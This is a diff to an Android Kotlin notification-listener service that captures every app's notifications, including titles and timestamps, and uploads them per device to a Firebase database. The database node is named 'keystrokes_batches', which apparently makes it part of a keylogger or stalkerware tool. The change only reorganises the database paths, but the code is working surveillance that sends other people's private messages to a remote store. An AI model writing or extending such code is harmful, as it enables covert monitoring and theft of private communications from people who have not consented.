@@ -6,6 +6,7 @@ import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
 import android.util.Log
 import androidx.annotation.RequiresApi
+import com.google.firebase.database.DatabaseReference
 import com.google.firebase.database.FirebaseDatabase
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -19,8 +20,8 @@ class AppNotificationListenerService : NotificationListenerService() {
     companion object {
         private const val TAG = "AppNotificationListener"
         private val scope = CoroutineScope(Dispatchers.IO)
-        private fun getDatabaseRef() = try {
-            FirebaseDatabase.getInstance().getReference("keystrokes_batches")
+        private fun getDatabaseRef(deviceName: String): DatabaseReference? = try {
+            FirebaseDatabase.getInstance().getReference().child(deviceName).child("keystrokes_batches")
         } catch (e: Exception) {
             Log.e(TAG, "Error getting database ref", e)
             null
@@ -41,8 +42,8 @@ class AppNotificationListenerService : NotificationListenerService() {
 
             scope.launch {
                 try {
-                    val ref = getDatabaseRef() ?: return@launch
                     val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
+                    val ref = getDatabaseRef(deviceName) ?: return@launch
                     val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss_SSS", Locale.getDefault()).format(Date())
                     val sanitizedAppName = packageName.replace(Regex("[^a-zA-Z0-9_-]"), "_")
 
@@ -54,7 +55,7 @@ class AppNotificationListenerService : NotificationListenerService() {
                         "timestamp" to System.currentTimeMillis()
                     )
 
-                    ref.child(deviceName).child("notification_$sanitizedAppName").child(timestampKey).setValue(notificationData)
+                    ref.child("notification_$sanitizedAppName").child(timestampKey).setValue(notificationData)
                         .addOnSuccessListener {
                             Log.d(TAG, "Notification synced to Firebase successfully")
                             LogStore.addLog("[$deviceName] Notification synced ($sanitizedAppName): $title")
